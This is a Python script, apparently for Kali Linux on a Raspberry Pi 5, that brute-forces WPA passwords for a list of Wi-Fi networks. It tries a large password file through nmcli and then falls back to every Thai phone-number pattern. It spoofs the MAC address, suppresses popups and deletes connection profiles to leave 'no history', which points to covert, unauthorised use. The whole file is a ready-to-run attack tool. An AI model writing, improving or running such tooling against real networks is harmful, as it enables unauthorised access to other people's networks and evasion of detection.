#!/usr/bin/env python3

import json
import mmap
import os
import random
import shutil
import subprocess
import sys
import time
from pathlib import Path


# ============================================================
# CONFIG & HARDWARE OPTIMIZATION (KALI PI 5)
# ============================================================

WIFI_FILE = Path("wifi.txt")
PASSWORD_FILE = Path("password.txt")
CHECKPOINT_FILE = Path(".wifi-audit-checkpoint.json")

# ใช้เฉพาะ Interface ที่กำหนด (เช่น wlan0) เพื่อไม่ให้กระทบ Wi-Fi หลักที่ต่อเน็ตอยู่
INTERFACE = "wlan0"
PROFILE_NAME = "temp_audit_profile"

# แสดง progress และบันทึก checkpoint ทุกๆ กี่ candidate
PROGRESS_EVERY = 50_000
CHECKPOINT_EVERY = 50_000

# หน่วงเวลาสุ่มเพื่อความปลอดภัยของ Access Point
DELAY_MIN = 0.02
DELAY_MAX = 0.05

# คำนำหน้าเบอร์โทรศัพท์
PHONE_PREFIXES_10 = ["06", "08", "09"]
PHONE_PREFIXES_9 = ["02", "03", "04", "05", "07"]

ENABLE_MAC_SPOOFING = True


# ============================================================
# SILENT BACKGROUND EXECUTOR (NO POPUPS)
# ============================================================

# กำหนด Environment เพื่อปิดกั้นหน้าต่าง GUI และ PolicyKit Pop-up ทั้งหมด
silent_env = os.environ.copy()
silent_env["LC_ALL"] = "C"
silent_env["DISPLAY"] = ""
silent_env["WAYLAND_DISPLAY"] = ""
silent_env["NO_AT_BRIDGE"] = "1"


def run_command(args, timeout=10):
    try:
        return subprocess.run(
            args,
            text=True,
            capture_output=True,
            timeout=timeout,
            check=False,
            env=silent_env,
        )
    except subprocess.TimeoutExpired:
        return None


def randomize_mac():
    if not ENABLE_MAC_SPOOFING:
        return

    run_command(["sudo", "ip", "link", "set", "dev", INTERFACE, "down"], timeout=5)
    
    if shutil.which("macchanger"):
        run_command(["sudo", "macchanger", "-r", INTERFACE], timeout=5)
    else:
        mac = "02:%02x:%02x:%02x:%02x:%02x" % (
            random.randint(0, 255), random.randint(0, 255), 
            random.randint(0, 255), random.randint(0, 255), 
            random.randint(0, 255)
        )
        run_command(["sudo", "ip", "link", "set", "dev", INTERFACE, "address", mac], timeout=5)

    run_command(["sudo", "ip", "link", "set", "dev", INTERFACE, "up"], timeout=5)
    time.sleep(0.5)


def optimize_wifi_interface():
    # ปิด Power Management ของการ์ด Wi-Fi เพื่อความเสถียรสูงสุด
    run_command(["sudo", "iw", "dev", INTERFACE, "set", "power_save", "off"], timeout=5)


# ============================================================
# ZERO-FOOTPRINT & CLEANUP UTILITIES
# ============================================================

def cleanup_traces():
    # ลบ Profile ชั่วคราวออกจาก NetworkManager ทันที เพื่อไม่ให้เหลือประวัติในเครื่อง
    run_command(["nmcli", "connection", "delete", PROFILE_NAME], timeout=5)
    run_command(["nmcli", "device", "disconnect", INTERFACE], timeout=5)


def check_candidate_silent(ssid, candidate):
    time.sleep(random.uniform(DELAY_MIN, DELAY_MAX))

    # สร้าง Connection Profile แบบระบุ Interface โดยเฉพาะ
    add_res = run_command([
        "nmcli", "connection", "add", 
        "type", "wifi", 
        "ifname", INTERFACE, 
        "con-name", PROFILE_NAME, 
        "ssid", ssid
    ], timeout=6)

    if add_res is None or add_res.returncode != 0:
        cleanup_traces()
        return False

    run_command([
        "nmcli", "connection", "modify", PROFILE_NAME, 
        "wifi-sec.key-mgmt", "wpa-psk", 
        "wifi-sec.psk", candidate
    ], timeout=5)

    up_res = run_command(["nmcli", "connection", "up", PROFILE_NAME], timeout=8)
    
    is_connected = False
    if up_res and up_res.returncode == 0:
        state_result = run_command([
            "nmcli", "-t", "-f", "GENERAL.STATE", "device", "show", INTERFACE
        ], timeout=5)
        if state_result and "100 (connected)" in state_result.stdout:
            is_connected = True

    cleanup_traces()
    return is_connected


def phone_number_generator():
    for prefix in PHONE_PREFIXES_10:
        for i in range(100_000_000):
            yield f"{prefix}{i:08d}"

    for prefix in PHONE_PREFIXES_9:
        for i in range(10_000_000):
            yield f"{prefix}{i:07d}"


# ============================================================
# CHECKPOINT MANAGEMENT
# ============================================================

def save_checkpoint(ssid_index, ssid, line_number, mode="password", phone_index=0):
    data = {
        "ssid_index": ssid_index,
        "ssid": ssid,
        "line": line_number,
        "mode": mode,
        "phone_index": phone_index,
    }
    temp_file = Path(str(CHECKPOINT_FILE) + ".tmp")
    temp_file.write_text(json.dumps(data, ensure_ascii=False, indent=2), encoding="utf-8")
    temp_file.replace(CHECKPOINT_FILE)


def load_checkpoint():
    if not CHECKPOINT_FILE.exists():
        return None
    try:
        return json.loads(CHECKPOINT_FILE.read_text(encoding="utf-8"))
    except (OSError, ValueError, TypeError):
        return None


def clear_checkpoint():
    try:
        CHECKPOINT_FILE.unlink(missing_ok=True)
    except OSError:
        pass


# ============================================================
# AUDIT ENGINE
# ============================================================

def audit_wifi(ssid, ssid_index, total, start_line=0, start_mode="password", start_phone_index=0):
    print(f"\n[{ssid_index + 1}/{total}] Background Audit SSID: {ssid}")
    optimize_wifi_interface()
    randomize_mac()

    checked = 0
    started_at = time.monotonic()
    passwords_exhausted = False

    # PHASE 1: PASSWORD FILE (ใช้ mmap อ่าน 50 ล้านแถวอย่างรวดเร็วในหน่วยความจำ)
    if start_mode == "password" and PASSWORD_FILE.exists():
        with open(PASSWORD_FILE, "r", encoding="utf-8-sig", errors="replace") as f:
            with mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ) as mm:
                line_number = 0
                while True:
                    line = mm.readline()
                    if not line:
                        break
                    line_number += 1

                    if line_number <= start_line:
                        continue

                    candidate = line.decode("utf-8", errors="ignore").rstrip("\r\n")
                    if not candidate:
                        continue

                    checked += 1
                    success = check_candidate_silent(ssid, candidate)

                    if success:
                        print(f"\n[MATCH FOUND] SSID: {ssid} | PASSWORD: {candidate} | LINE: {line_number:,}")
                        cleanup_traces()
                        return {
                            "ssid": ssid,
                            "success": True,
                            "password": candidate,
                            "password_line": line_number,
                            "checked": checked,
                        }

                    if checked % CHECKPOINT_EVERY == 0:
                        save_checkpoint(ssid_index, ssid, line_number, mode="password", phone_index=0)

                    if checked % PROGRESS_EVERY == 0:
                        elapsed = time.monotonic() - started_at
                        rate = (checked / elapsed) if elapsed > 0 else 0
                        print(f"[{ssid}] Checked: {checked:,} | Line: {line_number:,} | Rate: {rate:,.2f}/s")
        
        passwords_exhausted = True
    else:
        passwords_exhausted = True

    # PHASE 2: PHONE NUMBER GENERATOR
    if passwords_exhausted:
        print(f"[{ssid}] Password file exhausted -> Switching to Phone Number Generator...")
        phone_gen = phone_number_generator()
        phone_count = 0

        for p_idx, candidate in enumerate(phone_gen):
            if start_mode == "phone" and p_idx < start_phone_index:
                continue

            phone_count += 1
            checked += 1

            success = check_candidate_silent(ssid, candidate)

            if success:
                print(f"\n[MATCH FOUND - PHONE] SSID: {ssid} | NUMBER: {candidate}")
                cleanup_traces()
                return {
                    "ssid": ssid,
                    "success": True,
                    "password": candidate,
                    "password_line": p_idx,
                    "checked": checked,
                }

            if checked % CHECKPOINT_EVERY == 0:
                save_checkpoint(ssid_index, ssid, line_number=0, mode="phone", phone_index=p_idx)

            if phone_count % PROGRESS_EVERY == 0:
                elapsed = time.monotonic() - started_at
                rate = (checked / elapsed) if elapsed > 0 else 0
                print(f"[{ssid} - Phone] Checked: {checked:,} | Phone Index: {p_idx:,} | Rate: {rate:,.2f}/s")

    cleanup_traces()
    return {
        "ssid": ssid,
        "success": False,
        "password": None,
        "checked": checked,
    }


# ============================================================
# MAIN
# ============================================================

def main():
    if not WIFI_FILE.exists() or not PASSWORD_FILE.exists():
        sys.exit("ERROR: Missing wifi.txt or password.txt")

    targets = [line.strip() for line in WIFI_FILE.open("r", encoding="utf-8-sig") if line.strip()]
    checkpoint = load_checkpoint()

    start_ssid_index = 0
    resume_line = 0
    resume_mode = "password"
    resume_phone_index = 0

    if checkpoint:
        try:
            start_ssid_index = int(checkpoint.get("ssid_index", 0))
            resume_line = int(checkpoint.get("line", 0))
            resume_mode = checkpoint.get("mode", "password")
            resume_phone_index = int(checkpoint.get("phone_index", 0))
        except (ValueError, TypeError):
            pass

    results = []

    try:
        for index, ssid in enumerate(targets):
            if index < start_ssid_index:
                continue
            
            line = resume_line if (index == start_ssid_index and resume_mode == "password") else 0
            mode = resume_mode if index == start_ssid_index else "password"
            phone_idx = resume_phone_index if (index == start_ssid_index and resume_mode == "phone") else 0

            result = audit_wifi(
                ssid, index, len(targets),
                start_line=line, start_mode=mode, start_phone_index=phone_idx
            )
            results.append(result)

            save_checkpoint(index + 1, "", 0, mode="password", phone_index=0)
            resume_line = 0
            resume_mode = "password"
            resume_phone_index = 0

        clear_checkpoint()

    except KeyboardInterrupt:
        print("\nProcess interrupted by user. Checkpoint saved.")
        return 130

    print("\nAudit process completed cleanly. No history retained.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())